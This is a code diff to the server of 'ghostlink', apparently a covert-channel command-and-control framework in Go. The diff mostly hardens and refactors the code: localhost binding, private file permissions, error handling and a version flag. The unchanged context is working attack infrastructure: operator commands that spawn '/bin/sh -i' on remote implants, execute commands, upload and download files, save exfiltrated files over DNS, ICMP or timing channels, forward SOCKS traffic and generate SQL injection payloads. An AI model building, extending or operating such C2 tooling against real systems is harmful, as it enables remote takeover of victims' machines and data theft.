@@ -15,6 +15,8 @@ import (
 	"sync"
 	"syscall"
 
+	"github.com/byjanke/ghostlink/internal/buildinfo"
+	"github.com/byjanke/ghostlink/internal/safefile"
 	"github.com/byjanke/ghostlink/pkg/api"
 	"github.com/byjanke/ghostlink/pkg/channel"
 	"github.com/byjanke/ghostlink/pkg/crypto"
@@ -139,17 +141,24 @@ func (sm *SessionManager) List() []*ManagedSession {
 }
 
 func main() {
-	addr := flag.String("addr", "0.0.0.0:16353", "listen address")
+	addr := flag.String("addr", "127.0.0.1:16353", "listen address")
 	channelType := flag.String("channel", "dns", "channel type: dns, http, icmp, ip_id, timing, packet_size, tcp_isn, websocket, doh")
 	key := flag.String("key", "", "pre-shared key (empty = no encryption)")
 	ecdhe := flag.Bool("ecdhe", false, "automatic ECDH key exchange")
 	domain := flag.String("domain", "", "authoritative domain for DNS (enables auth DNS mode)")
 	apiAddr := flag.String("api", "", "REST API listen address (e.g. 127.0.0.1:8888)")
 	exfilDir := flag.String("exfil-dir", "./exfiltrated", "directory to save exfiltrated files")
+	showVersion := flag.Bool("version", false, "print version and exit")
 	flag.Parse()
+	if *showVersion {
+		fmt.Println(buildinfo.String())
+		return
+	}
 
 	if *exfilDir != "" {
-		os.MkdirAll(*exfilDir, 0755)
+		if err := os.MkdirAll(*exfilDir, 0700); err != nil {
+			log.Fatalf("create output directory: %v", err)
+		}
 	}
 
 	if *domain != "" && *channelType == "dns" {
@@ -164,7 +173,7 @@ func main() {
 		mode = "PSK"
 	}
 
-	fmt.Printf("ghostlink v1.0 | %s | %s | %s | proto v%d\n", *channelType, *addr, mode, protocol.ProtocolVersion)
+	fmt.Printf("%s | %s | %s | %s | proto v%d\n", buildinfo.String(), *channelType, *addr, mode, protocol.ProtocolVersion)
 	fmt.Println("[*] waiting for connections...")
 
 	listener := channel.NewListener(channel.ChannelType(*channelType))
@@ -248,7 +257,7 @@ func setupCrypto(ch channel.Channel, key string, ecdhe bool) *crypto.Session {
 }
 
 func runAuthDNS(domain, key string, ecdhe bool, addr string) {
-	fmt.Printf("ghostlink auth-dns v1.0 | domain: %s | %s\n", domain, addr)
+	fmt.Printf("%s | auth-dns | domain: %s | %s\n", buildinfo.String(), domain, addr)
 	fmt.Println("[*] authoritative DNS server starting...")
 
 	srv := channel.NewAuthDNSServer(domain)
@@ -266,7 +275,11 @@ func runAuthDNS(domain, key string, ecdhe bool, addr string) {
 				output = []byte(fmt.Sprintf("error: %v", err))
 			}
 			resp := protocol.Message{Type: protocol.MsgCmdRes, Payload: output}
-			result := protocol.Marshal(resp)
+			result, err := protocol.MarshalBinary(resp)
+			if err != nil {
+				log.Printf("encode response: %v", err)
+				return nil
+			}
 			srv.SendResponse(result)
 			return nil
 		case protocol.MsgShellStdout:
@@ -327,7 +340,7 @@ func handleC2Command(line string, send func([]byte)) {
 	switch parts[0] {
 	case "shell":
 		msg := protocol.Message{Type: protocol.MsgShellStdin, Payload: []byte("/bin/sh -i\n")}
-		send(protocol.Marshal(msg))
+		sendProtocolMessage(send, msg)
 		fmt.Println("[*] shell spawned")
 	case "exec":
 		if len(parts) < 2 {
@@ -336,7 +349,7 @@ func handleC2Command(line string, send func([]byte)) {
 		}
 		cmd := strings.Join(parts[1:], " ")
 		msg := protocol.Message{Type: protocol.MsgCmdReq, Payload: []byte(cmd)}
-		send(protocol.Marshal(msg))
+		sendProtocolMessage(send, msg)
 		fmt.Printf("[*] command sent: %s\n", cmd)
 	case "upload":
 		if len(parts) < 3 {
@@ -350,7 +363,7 @@ func handleC2Command(line string, send func([]byte)) {
 		}
 		hdr := fmt.Sprintf("%s\n", parts[2])
 		msg := protocol.Message{Type: protocol.MsgFilePut, Payload: append([]byte(hdr), data...)}
-		send(protocol.Marshal(msg))
+		sendProtocolMessage(send, msg)
 		fmt.Printf("[*] file sent: %s -> %s (%d bytes)\n", parts[1], parts[2], len(data))
 	case "download":
 		if len(parts) < 2 {
@@ -358,14 +371,24 @@ func handleC2Command(line string, send func([]byte)) {
 			return
 		}
 		msg := protocol.Message{Type: protocol.MsgFileGetReq, Payload: []byte(parts[1])}
-		send(protocol.Marshal(msg))
+		sendProtocolMessage(send, msg)
 		fmt.Printf("[*] download request: %s\n", parts[1])
 	case "help":
 		fmt.Println("commands: shell, exec <cmd>, upload <local> <remote>, download <remote>, exit")
 	default:
 		msg := protocol.Message{Type: protocol.MsgShellStdin, Payload: []byte(line + "\n")}
-		send(protocol.Marshal(msg))
+		sendProtocolMessage(send, msg)
 	}
+}
+
+func sendProtocolMessage(send func([]byte), msg protocol.Message) bool {
+	wire, err := protocol.MarshalBinary(msg)
+	if err != nil {
+		fmt.Printf("[-] encode message: %v\n", err)
+		return false
+	}
+	send(wire)
+	return true
 }
 
 func handleSession(s *ManagedSession, mgr *SessionManager, exfilDir string) {
@@ -431,11 +454,11 @@ func handleSession(s *ManagedSession, mgr *SessionManager, exfilDir string) {
 }
 
 func sanitizeFileName(name string) string {
-	name = filepath.Base(name)
-	if name == "." || name == "/" {
-		return "unnamed"
-	}
-	return name
+	return safefile.BaseName(name)
+}
+
+func writePrivateFile(path string, data []byte) error {
+	return safefile.WriteFile(path, data)
 }
 
 func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
@@ -452,11 +475,7 @@ func handleExfilFile(msg protocol.Message, exfilDir string, s *ManagedSession) {
 	fmt.Sscanf(sizeStr, "%d", &size)
 
 	destPath := filepath.Join(exfilDir, fmt.Sprintf("%s_%d", filename, s.ID))
-	if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
-		fmt.Printf("[exfil] save error: %v\n", err)
-		return
-	}
-	if err := os.WriteFile(destPath, data, 0644); err != nil {
+	if err := writePrivateFile(destPath, data); err != nil {
 		fmt.Printf("[exfil] save error: %v\n", err)
 		return
 	}
@@ -481,13 +500,7 @@ func handleExfilGlob(msg protocol.Message, exfilDir string, s *ManagedSession) {
 
 		safePath := sanitizeFileName(f.Path)
 		destPath := filepath.Join(exfilDir, fmt.Sprintf("%s_%d", safePath, s.ID))
-		destDir := filepath.Dir(destPath)
-		if err := os.MkdirAll(destDir, 0755); err != nil {
-			fmt.Printf("  [-] %s: save error: %v\n", f.Path, err)
-			continue
-		}
-
-		if err := os.WriteFile(destPath, f.Content, 0644); err != nil {
+		if err := writePrivateFile(destPath, f.Content); err != nil {
 			fmt.Printf("  [-] %s: save error: %v\n", f.Path, err)
 			continue
 		}
@@ -544,16 +557,22 @@ func handleSocksClose(s *ManagedSession, msg protocol.Message) {
 	s.mu.Unlock()
 }
 
-func sessionSendMsg(s *ManagedSession, msg protocol.Message) {
-	data := protocol.Marshal(msg)
+func sessionSendMsg(s *ManagedSession, msg protocol.Message) error {
+	data, err := protocol.MarshalBinary(msg)
+	if err != nil {
+		return fmt.Errorf("encode message: %w", err)
+	}
 	if s.CryptoSes != nil {
 		enc, err := s.CryptoSes.Encrypt(data)
 		if err != nil {
-			return
+			return fmt.Errorf("encrypt message: %w", err)
 		}
 		data = enc
 	}
-	s.Channel.Send(data)
+	if err := s.Channel.Send(data); err != nil {
+		return fmt.Errorf("send message: %w", err)
+	}
+	return nil
 }
 
 func handleFwdDataReceive(msg protocol.Message, fwds map[uint32]*forward.Tunnel) {
@@ -723,8 +742,8 @@ func interactiveConsole(mgr *SessionManager, modRegistry *modules.Registry, exfi
 				fmt.Println("usage: sqli <db> <domain> [query]")
 				fmt.Println("  db: mysql, mssql, oracle, postgres")
 			} else {
-			gen := modules.NewSQLiPayloadGenerator()
-			output, err := gen.Run(parts[1:])
+				gen := modules.NewSQLiPayloadGenerator()
+				output, err := gen.Run(parts[1:])
 				if err != nil {
 					fmt.Printf("[-] %v\n", err)
 				} else {
@@ -858,5 +877,3 @@ func (p *c2APIProvider) ListModules() []map[string]string {
 	}
 	return result
 }
-
-
